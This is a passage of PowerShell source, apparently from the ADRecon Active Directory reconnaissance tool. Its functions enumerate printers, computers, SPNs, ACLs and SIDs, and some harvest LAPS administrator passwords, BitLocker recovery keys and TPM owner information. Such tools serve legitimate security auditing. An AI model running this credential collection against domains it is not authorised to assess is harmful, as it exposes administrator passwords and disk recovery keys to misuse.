                        $ObjNode | Add-Member -MemberType NoteProperty -Name Name -Value $name
                        Try
                        {
                            $DNSRecord = Convert-DNSRecord $_.Properties.dnsrecord[0]
                        }
                        Catch
                        {
                            Write-Warning "[Get-ADRDNSZone] Error while converting the DNSRecord"
                            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name RecordType -Value $DNSRecord.RecordType
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Data -Value $DNSRecord.Data
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TTL -Value $DNSRecord.TTL
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Age -Value $DNSRecord.Age
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TimeStamp -Value $DNSRecord.TimeStamp
                        $ObjNode | Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value $DNSRecord.UpdatedAtSerial
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] $($_.Properties.whencreated))
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] $($_.Properties.whenchanged))



                        $ObjNode | Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value ([string] $($_.Properties.showinadvancedviewonly))
                        $ObjNode | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] $($_.Properties.distinguishedname))
                        $ADDNSNodesObj += $ObjNode
                        If ($DNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $null
                }
                $Obj | Add-Member -MemberType NoteProperty -Name USNCreated -Value ([string] $($_.Properties.usncreated))
                $Obj | Add-Member -MemberType NoteProperty -Name USNChanged -Value ([string] $($_.Properties.usnchanged))
                $Obj | Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] $($_.Properties.whenchanged))
                $Obj | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] $($_.Properties.distinguishedname))
                $ADDNSZonesObj += $Obj
            }
            Write-Verbose "[*] Total DNS Records: $([ADRecon.LDAPClass]::ObjectCount($ADDNSNodesObj))"
            Remove-Variable DNSZoneArray
        }
    }

    If ($ADDNSZonesObj)
    {
        Export-ADR $ADDNSZonesObj $ADROutputDir $OutputType "DNSZones"
        Remove-Variable ADDNSZonesObj
    }

    If ($ADDNSNodesObj)
    {
        Export-ADR $ADDNSNodesObj $ADROutputDir $OutputType "DNSNodes"
        Remove-Variable ADDNSNodesObj
    }
}

Function Get-ADRPrinter
{


    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADPrinters = @( Get-ADObject -LDAPFilter '(objectCategory=printQueue)' -Properties driverName,driverVersion,Name,portName,printShareName,serverName,url,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning "[Get-ADRPrinter] Error while enumerating printQueue Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADPrinters)
        {
            Write-Verbose "[*] Total Printers: $([ADRecon.ADWSClass]::ObjectCount($ADPrinters))"
            $PrintersObj = [ADRecon.ADWSClass]::PrinterParser($ADPrinters, $Threads)
            Remove-Variable ADPrinters
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectCategory=printQueue)"
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADPrinters = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRPrinter] Error while enumerating printQueue Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADPrinters)
        {
            $cnt = $([ADRecon.LDAPClass]::ObjectCount($ADPrinters))
            If ($cnt -ge 1)
            {
                Write-Verbose "[*] Total Printers: $cnt"
                $PrintersObj = [ADRecon.LDAPClass]::PrinterParser($ADPrinters, $Threads)
            }
            Remove-Variable ADPrinters
        }
    }

    If ($PrintersObj)
    {
        Return $PrintersObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRComputer
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $DormantTimeSpan = 90,

        [Parameter(Mandatory = $true)]
        [int] $PassMaxAge = 30,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADComputers = @( Get-ADComputer -Filter * -ResultPageSize $PageSize -Properties Description,DistinguishedName,DNSHostName,Enabled,IPv4Address,LastLogonDate,'msDS-AllowedToDelegateTo','ms-ds-CreatorSid','msDS-SupportedEncryptionTypes',Name,OperatingSystem,OperatingSystemHotfix,OperatingSystemServicePack,OperatingSystemVersion,PasswordLastSet,primaryGroupID,SamAccountName,SID,SIDHistory,TrustedForDelegation,TrustedToAuthForDelegation,UserAccountControl,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning "[Get-ADRComputer] Error while enumerating Computer Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total Computers: $([ADRecon.ADWSClass]::ObjectCount($ADComputers))"
            $ComputerObj = [ADRecon.ADWSClass]::ComputerParser($ADComputers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(samAccountType=805306369)"
        $ObjSearcher.PropertiesToLoad.AddRange(("description","distinguishedname","dnshostname","lastlogontimestamp","msDS-AllowedToDelegateTo","ms-ds-CreatorSid","msDS-SupportedEncryptionTypes","name","objectsid","operatingsystem","operatingsystemhotfix","operatingsystemservicepack","operatingsystemversion","primarygroupid","pwdlastset","samaccountname","sidhistory","useraccountcontrol","whenchanged","whencreated"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADComputers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRComputer] Error while enumerating Computer Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADComputers)
        {
            Write-Verbose "[*] Total Computers: $([ADRecon.LDAPClass]::ObjectCount($ADComputers))"
            $ComputerObj = [ADRecon.LDAPClass]::ComputerParser($ADComputers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($ComputerObj)
    {
        Return $ComputerObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRComputerSPN
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADComputers = @( Get-ADObject -LDAPFilter "(&(samAccountType=805306369)(servicePrincipalName=*))" -Properties Name,servicePrincipalName -ResultPageSize $PageSize )
        }
        Catch
        {
            Write-Warning "[Get-ADRComputerSPN] Error while enumerating ComputerSPN Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total ComputerSPNs: $([ADRecon.ADWSClass]::ObjectCount($ADComputers))"
            $ComputerSPNObj = [ADRecon.ADWSClass]::ComputerSPNParser($ADComputers, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(&(samAccountType=805306369)(servicePrincipalName=*))"
        $ObjSearcher.PropertiesToLoad.AddRange(("name","serviceprincipalname"))
        $ObjSearcher.SearchScope = "Subtree"
        Try
        {
            $ADComputers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRComputerSPN] Error while enumerating ComputerSPN Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADComputers)
        {
            Write-Verbose "[*] Total ComputerSPNs: $([ADRecon.LDAPClass]::ObjectCount($ADComputers))"
            $ComputerSPNObj = [ADRecon.LDAPClass]::ComputerSPNParser($ADComputers, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($ComputerSPNObj)
    {
        Return $ComputerSPNObj
    }
    Else
    {
        Return $null
    }
}


Function Get-ADRLAPSCheck
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADComputers = @( Get-ADObject -LDAPFilter "(samAccountType=805306369)" -Properties CN,DNSHostName,'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' -ResultPageSize $PageSize )
        }
        Catch [System.ArgumentException]
        {
            Write-Warning "[*] LAPS is not implemented."
            Return $null
        }
        Catch
        {
            Write-Warning "[Get-ADRLAPSCheck] Error while enumerating LAPS Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total LAPS Objects: $([ADRecon.ADWSClass]::ObjectCount($ADComputers))"
            $LAPSObj = [ADRecon.ADWSClass]::LAPSParser($ADComputers, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(samAccountType=805306369)"
        $ObjSearcher.PropertiesToLoad.AddRange(("cn","dnshostname","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"))
        $ObjSearcher.SearchScope = "Subtree"
        Try
        {
            $ADComputers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRLAPSCheck] Error while enumerating LAPS Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADComputers)
        {
            $LAPSCheck = [ADRecon.LDAPClass]::LAPSCheck($ADComputers)
            If (-Not $LAPSCheck)
            {
                Write-Warning "[*] LAPS is not implemented."
                Return $null
            }
            Else
            {
                Write-Verbose "[*] Total LAPS Objects: $([ADRecon.LDAPClass]::ObjectCount($ADComputers))"
                $LAPSObj = [ADRecon.LDAPClass]::LAPSParser($ADComputers, $Threads)
                Remove-Variable ADComputers
            }
        }
    }

    If ($LAPSObj)
    {
        Return $LAPSObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRBitLocker
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADBitLockerRecoveryKeys = Get-ADObject -LDAPFilter '(objectClass=msFVE-RecoveryInformation)' -Properties distinguishedName,msFVE-RecoveryPassword,msFVE-RecoveryGuid,msFVE-VolumeGuid,Name,whenCreated
        }
        Catch
        {
            Write-Warning "[Get-ADRBitLocker] Error while enumerating msFVE-RecoveryInformation Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADBitLockerRecoveryKeys)
        {
            $cnt = $([ADRecon.ADWSClass]::ObjectCount($ADBitLockerRecoveryKeys))
            If ($cnt -ge 1)
            {
                Write-Verbose "[*] Total BitLocker Recovery Keys: $cnt"
                $BitLockerObj = @()
                $ADBitLockerRecoveryKeys | ForEach-Object {

                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name "Distinguished Name" -Value $((($_.distinguishedName -split '}')[1]).substring(1))
                    $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value $_.Name
                    $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value $_.whenCreated
                    $Obj | Add-Member -MemberType NoteProperty -Name "Recovery Key ID" -Value $([GUID] $_.'msFVE-RecoveryGuid')
                    $Obj | Add-Member -MemberType NoteProperty -Name "Recovery Key" -Value $_.'msFVE-RecoveryPassword'
                    $Obj | Add-Member -MemberType NoteProperty -Name "Volume GUID" -Value $([GUID] $_.'msFVE-VolumeGuid')
                    Try
                    {
                        $TempComp = Get-ADComputer -Identity $Obj.'Distinguished Name' -Properties msTPM-OwnerInformation,msTPM-TpmInformationForComputer
                    }
                    Catch
                    {
                        Write-Warning "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object"
                        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                    }
                    If ($TempComp)
                    {

                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-OwnerInformation" -Value $TempComp.'msTPM-OwnerInformation'


                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-TpmInformationForComputer" -Value $TempComp.'msTPM-TpmInformationForComputer'
                        If ($null -ne $TempComp.'msTPM-TpmInformationForComputer')
                        {

                            $TPMObject = Get-ADObject -Identity $TempComp.'msTPM-TpmInformationForComputer' -Properties msTPM-OwnerInformation
                            $TPMRecoveryInfo = $TPMObject.'msTPM-OwnerInformation'
                        }
                        Else
                        {
                            $TPMRecoveryInfo = $null
                        }
                    }
                    Else
                    {
                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-OwnerInformation" -Value $null
                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-TpmInformationForComputer" -Value $null
                        $TPMRecoveryInfo = $null

                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name "TPM Owner Password" -Value $TPMRecoveryInfo
                    $BitLockerObj += $Obj
                }
            }
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectClass=msFVE-RecoveryInformation)"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedName","msfve-recoverypassword","msfve-recoveryguid","msfve-volumeguid","mstpm-ownerinformation","mstpm-tpminformationforcomputer","name","whencreated"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADBitLockerRecoveryKeys = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRBitLocker] Error while enumerating msFVE-RecoveryInformation Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADBitLockerRecoveryKeys)
        {
            $cnt = $([ADRecon.LDAPClass]::ObjectCount($ADBitLockerRecoveryKeys))
            If ($cnt -ge 1)
            {
                Write-Verbose "[*] Total BitLocker Recovery Keys: $cnt"
                $BitLockerObj = @()
                $ADBitLockerRecoveryKeys | ForEach-Object {

                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name "Distinguished Name" -Value $((($_.Properties.distinguishedname -split '}')[1]).substring(1))
                    $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value ([string] ($_.Properties.name))
                    $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value ([DateTime] $($_.Properties.whencreated))
                    $Obj | Add-Member -MemberType NoteProperty -Name "Recovery Key ID" -Value $([GUID] $_.Properties.'msfve-recoveryguid'[0])
                    $Obj | Add-Member -MemberType NoteProperty -Name "Recovery Key" -Value ([string] ($_.Properties.'msfve-recoverypassword'))
                    $Obj | Add-Member -MemberType NoteProperty -Name "Volume GUID" -Value $([GUID] $_.Properties.'msfve-volumeguid'[0])

                    $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    $ObjSearcher.PageSize = $PageSize
                    $ObjSearcher.Filter = "(&(samAccountType=805306369)(distinguishedName=$($Obj.'Distinguished Name')))"
                    $ObjSearcher.PropertiesToLoad.AddRange(("mstpm-ownerinformation","mstpm-tpminformationforcomputer"))
                    $ObjSearcher.SearchScope = "Subtree"

                    Try
                    {
                        $TempComp = $ObjSearcher.FindAll()
                    }
                    Catch
                    {
                        Write-Warning "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object"
                        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                    }
                    $ObjSearcher.dispose()

                    If ($TempComp)
                    {

                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-OwnerInformation" -Value $([string] $TempComp.Properties.'mstpm-ownerinformation')


                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-TpmInformationForComputer" -Value $([string] $TempComp.Properties.'mstpm-tpminformationforcomputer')
                        If ($null -ne $TempComp.Properties.'mstpm-tpminformationforcomputer')
                        {

                            If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                            {
                                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($TempComp.Properties.'mstpm-tpminformationforcomputer')", $Credential.UserName,$Credential.GetNetworkCredential().Password
                                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                                $objSearcherPath.PropertiesToLoad.AddRange(("mstpm-ownerinformation"))
                                Try
                                {
                                    $TPMObject = $objSearcherPath.FindAll()
                                }
                                Catch
                                {
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                }
                                $objSearcherPath.dispose()

                                If ($TPMObject)
                                {
                                    $TPMRecoveryInfo = $([string] $TPMObject.Properties.'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    $TPMRecoveryInfo = $null
                                }
                            }
                            Else
                            {
                                Try
                                {
                                    $TPMObject = ([ADSI]"LDAP://$($TempComp.Properties.'mstpm-tpminformationforcomputer')")
                                }
                                Catch
                                {
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                }
                                If ($TPMObject)
                                {
                                    $TPMRecoveryInfo = $([string] $TPMObject.Properties.'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    $TPMRecoveryInfo = $null
                                }
                            }
                        }
                    }
                    Else
                    {
                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-OwnerInformation" -Value $null
                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-TpmInformationForComputer" -Value $null
                        $TPMRecoveryInfo = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name "TPM Owner Password" -Value $TPMRecoveryInfo
                    $BitLockerObj += $Obj
                }
            }
            Remove-Variable cnt
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If ($BitLockerObj)
    {
        Return $BitLockerObj
    }
    Else
    {
        Return $null
    }
}


Function ConvertFrom-SID
{

    Param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $true)]
        [Alias('SID')]

        [String]
        $ObjectSid,

        [Parameter(Mandatory = $false)]
        [string] $DomainFQDN,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false)]
        [bool] $ResolveSID = $false
    )

    BEGIN {


        $ADS_NAME_INITTYPE_DOMAIN   = 1 # Initializes a NameTranslate object by setting the domain that the object binds to.

        $ADS_NAME_INITTYPE_GC       = 3 # Initializes a NameTranslate object by locating the global catalog that the object binds to.





        $ADS_NAME_TYPE_NT4                      = 3 # Account name format used in Windows. For example, "Fabrikam\JeffSmith".




        $ADS_NAME_TYPE_UNKNOWN                  = 8 # Unknown name type. The system will estimate the format. This element is a meaningful option only with the IADsNameTranslate.Set or the IADsNameTranslate.SetEx method, but not with the IADsNameTranslate.Get or IADsNameTranslate.GetEx method.









        $ADS_CHASE_REFERRALS_ALWAYS      = (0x60) # Referrals are chased for either the subordinate or external type.
    }

    PROCESS {
        $TargetSid = $($ObjectSid.TrimStart("O:"))
        $TargetSid = $($TargetSid.Trim('*'))
        If ($TargetSid -match '^S-1-.*')
        {
            Try
            {

                Switch ($TargetSid) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Remote Management Users' }
                    Default {

                        If ( ($TargetSid -match '^S-1-.*') -and ($ResolveSID) )
                        {
                            If ($Protocol -eq 'ADWS')
                            {
                                Try
                                {
                                    $ADObject = Get-ADObject -Filter "objectSid -eq '$TargetSid'" -Properties DistinguishedName,sAMAccountName
                                }
                                Catch
                                {
                                    Write-Warning "[ConvertFrom-SID] Error while enumerating Object using SID"
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                }
                                If ($ADObject)
                                {
                                    $UserDomain = Get-DNtoFQDN -ADObjectDN $ADObject.DistinguishedName
                                    $ADSOutput = $UserDomain + "\" + $ADObject.sAMAccountName
                                    Remove-Variable UserDomain
                                }
                            }

                            If ($Protocol -eq 'LDAP')
                            {
                                If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                                {
                                    $ADObject = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainFQDN/<SID=$TargetSid>",($Credential.GetNetworkCredential()).UserName,($Credential.GetNetworkCredential()).Password)
                                }
                                Else
                                {
                                    $ADObject = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainFQDN/<SID=$TargetSid>")
                                }
                                If ($ADObject)
                                {
                                    If (-Not ([string]::IsNullOrEmpty($ADObject.Properties.samaccountname)) )
                                    {
                                        $UserDomain = Get-DNtoFQDN -ADObjectDN $([string] ($ADObject.Properties.distinguishedname))
                                        $ADSOutput = $UserDomain + "\" + $([string] ($ADObject.Properties.samaccountname))
                                        Remove-Variable UserDomain
                                    }
                                }
                            }

                            If ( (-Not $ADSOutput) -or ([string]::IsNullOrEmpty($ADSOutput)) )
                            {
                                $ADSOutputType = $ADS_NAME_TYPE_NT4
                                $Init = $true
                                $Translate = New-Object -ComObject NameTranslate
                                If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                                {
                                    $ADSInitType = $ADS_NAME_INITTYPE_DOMAIN
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(“InitEx”,”InvokeMethod”,$null,$Translate,$(@($ADSInitType,$DomainFQDN,($Credential.GetNetworkCredential()).UserName,$DomainFQDN,($Credential.GetNetworkCredential()).Password)))
                                    }
                                    Catch
                                    {
                                        $Init = $false


                                    }
                                }
                                Else
                                {
                                    $ADSInitType = $ADS_NAME_INITTYPE_GC
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(“Init”,”InvokeMethod”,$null,$Translate,($ADSInitType,$null))
                                    }
                                    Catch
                                    {
                                        $Init = $false


                                    }
                                }
                                If ($Init)
                                {
                                    [System.__ComObject].InvokeMember(“ChaseReferral”,”SetProperty”,$null,$Translate,$ADS_CHASE_REFERRALS_ALWAYS)
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(“Set”,”InvokeMethod”,$null,$Translate,($ADS_NAME_TYPE_UNKNOWN, $TargetSID))
                                        $ADSOutput = [System.__ComObject].InvokeMember(“Get”,”InvokeMethod”,$null,$Translate,$ADSOutputType)
                                    }
                                    Catch
                                    {


                                    }
                                }
                            }
                        }
                        If (-Not ([string]::IsNullOrEmpty($ADSOutput)) )
                        {
                            Return $ADSOutput
                        }
                        Else
                        {
                            Return $TargetSid
                        }
                    }
                }
            }
            Catch
            {


            }
        }
        Else
        {
            Return $TargetSid
        }
    }
}


Function Get-ADRACL
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false)]
        [bool] $ResolveSID = $false,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        If ($Credential -eq [Management.Automation.PSCredential]::Empty)
        {
            If (Test-Path AD:)
            {
                Set-Location AD:
            }
            Else
            {
                Write-Warning "Default AD drive not found ... Skipping ACL enumeration"
                Return $null
            }
        }
        $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}
        Try
        {
            Write-Verbose "[*] Enumerating schemaIDs"
            $schemaIDs = Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -LDAPFilter '(schemaIDGUID=*)' -Properties name, schemaIDGUID
        }
        Catch
        {
            Write-Warning "[Get-ADRACL] Error while enumerating schemaIDs"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }

        If ($schemaIDs)
        {
            $schemaIDs | Where-Object {$_} | ForEach-Object {

                $GUIDs[(New-Object Guid (,$_.schemaIDGUID)).Guid] = $_.name
            }
            Remove-Variable schemaIDs
        }

        Try
        {
            Write-Verbose "[*] Enumerating Active Directory Rights"
            $schemaIDs = Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter '(objectClass=controlAccessRight)' -Properties name, rightsGUID
        }
        Catch
        {
            Write-Warning "[Get-ADRACL] Error while enumerating Active Directory Rights"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }

        If ($schemaIDs)
        {
            $schemaIDs | Where-Object {$_} | ForEach-Object {

